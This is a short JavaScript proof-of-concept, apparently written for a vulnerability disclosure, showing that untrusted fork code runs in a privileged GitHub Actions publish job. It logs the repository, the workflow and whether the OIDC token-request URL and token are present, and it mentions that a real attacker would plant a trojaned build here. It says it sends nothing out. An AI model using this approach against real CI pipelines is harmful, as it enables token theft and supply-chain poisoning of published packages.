const line = (k, v) => console.log(`  ${k}: ${v}`);
console.log('===== PWN PROOF: untrusted fork code running in the PRIVILEGED publish job =====');
line('GITHUB_REPOSITORY', process.env.GITHUB_REPOSITORY);
line('GITHUB_WORKFLOW', process.env.GITHUB_WORKFLOW);
line('cwd', process.cwd());
line('OIDC token-request URL present', Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_URL));
line('OIDC token-request TOKEN present', Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN));
console.log('A real attacker emits a trojaned dist/ here. This PoC does NO network / NO exfil.');
console.log('===============================================================================');
